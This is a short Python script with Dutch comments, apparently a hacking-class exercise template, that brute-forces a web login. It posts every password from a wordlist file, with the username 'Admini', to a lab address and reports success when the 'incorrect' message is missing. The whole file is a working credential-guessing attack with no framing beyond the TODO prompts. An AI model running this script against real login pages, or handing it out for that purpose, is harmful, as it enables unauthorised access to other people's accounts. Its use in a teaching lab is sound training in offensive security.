import requests

URL  = "http://172.16.2.177:8000/login" # TODO: Op welke inlogpagina de aanval uitvoeren?
USER = "Admini" # TODO: Wat is de gebruikersnaam?

with open(r"Hacken\woordenboek_wachtw.txt", "r") as fp: # TODO: pad naar woordenboek wachtwoorden.
    wachtwoorden = [line.strip() for line in fp]

for wachtwoord in wachtwoorden:
    data = {'username': USER, "password": wachtwoord, "Submin": 'submit'} # TODO: zet data klaar om naar inlog te sturen.
    response = requests.post(URL, data=data).text

    if "Username or Password was incorrect." in str(response):    # TODO: Hoe weet je als de inlog-poging NIET gelukt is?
        print(f"Incorrecte Combinatie. User:{USER} Wachtwoord:{wachtwoord}.")
    else:
        print(f"Je bent binnen! Naam:{USER} Wachtwoord:{wachtwoord}")
        break